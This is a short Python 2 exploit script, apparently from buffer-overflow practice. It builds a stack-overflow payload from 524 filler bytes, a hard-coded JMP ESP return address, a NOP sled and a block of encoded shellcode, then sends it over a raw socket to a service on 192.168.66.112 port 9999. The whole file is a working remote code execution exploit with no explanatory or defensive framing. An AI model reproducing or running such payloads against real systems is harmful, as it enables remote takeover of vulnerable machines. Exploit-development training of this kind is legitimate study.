#!/usr/bin/python2
import socket
# crashes on 1600
# offset 524
#JMP ESP 
jmp_esp="\xf3\x12\x17\x31"
buff="A"*524
buff+=jmp_esp
buff+="\x90"*32
shellcode=("\xbd\xda\x1f\xb9\x12\xda\xd9\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
        "\x52\x83\xe8\xfc\x31\x68\x0e\x03\xb2\x11\x5b\xe7\xbe\xc6\x19"
        "\x08\x3e\x17\x7e\x80\xdb\x26\xbe\xf6\xa8\x19\x0e\x7c\xfc\x95"
        "\xe5\xd0\x14\x2d\x8b\xfc\x1b\x86\x26\xdb\x12\x17\x1a\x1f\x35"
        "\x9b\x61\x4c\x95\xa2\xa9\x81\xd4\xe3\xd4\x68\x84\xbc\x93\xdf"
        "\x38\xc8\xee\xe3\xb3\x82\xff\x63\x20\x52\x01\x45\xf7\xe8\x58"
        "\x45\xf6\x3d\xd1\xcc\xe0\x22\xdc\x87\x9b\x91\xaa\x19\x4d\xe8"
        "\x53\xb5\xb0\xc4\xa1\xc7\xf5\xe3\x59\xb2\x0f\x10\xe7\xc5\xd4"
        "\x6a\x33\x43\xce\xcd\xb0\xf3\x2a\xef\x15\x65\xb9\xe3\xd2\xe1"
        "\xe5\xe7\xe5\x26\x9e\x1c\x6d\xc9\x70\x95\x35\xee\x54\xfd\xee"
        "\x8f\xcd\x5b\x40\xaf\x0d\x04\x3d\x15\x46\xa9\x2a\x24\x05\xa6"
        "\x9f\x05\xb5\x36\x88\x1e\xc6\x04\x17\xb5\x40\x25\xd0\x13\x97"
        "\x4a\xcb\xe4\x07\xb5\xf4\x14\x0e\x72\xa0\x44\x38\x53\xc9\x0e"
        "\xb8\x5c\x1c\x80\xe8\xf2\xcf\x61\x58\xb3\xbf\x09\xb2\x3c\x9f"
        "\x2a\xbd\x96\x88\xc1\x44\x71\x77\xbd\x04\xf9\x1f\xbc\x88\xf8"
        "\x64\x49\x6e\x90\x8a\x1c\x39\x0d\x32\x05\xb1\xac\xbb\x93\xbc"
        "\xef\x30\x10\x41\xa1\xb0\x5d\x51\x56\x31\x28\x0b\xf1\x4e\x86"
        "\x23\x9d\xdd\x4d\xb3\xe8\xfd\xd9\xe4\xbd\x30\x10\x60\x50\x6a"
        "\x8a\x96\xa9\xea\xf5\x12\x76\xcf\xf8\x9b\xfb\x6b\xdf\x8b\xc5"
        "\x74\x5b\xff\x99\x22\x35\xa9\x5f\x9d\xf7\x03\x36\x72\x5e\xc3"
        "\xcf\xb8\x61\x95\xcf\x94\x17\x79\x61\x41\x6e\x86\x4e\x05\x66"
        "\xff\xb2\xb5\x89\x2a\x77\xd5\x6b\xfe\x82\x7e\x32\x6b\x2f\xe3"
        "\xc5\x46\x6c\x1a\x46\x62\x0d\xd9\x56\x07\x08\xa5\xd0\xf4\x60"
        "\xb6\xb4\xfa\xd7\xb7\x9c")
buff+=shellcode
print "Fuzzing with {}".format(len(buff))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("192.168.66.112",9999))
print "Connected"
s.recv(1024)
s.send(buff + "\r\n")
print "sended"
s.close()
print "closed"
buff+="A"*len(buff)
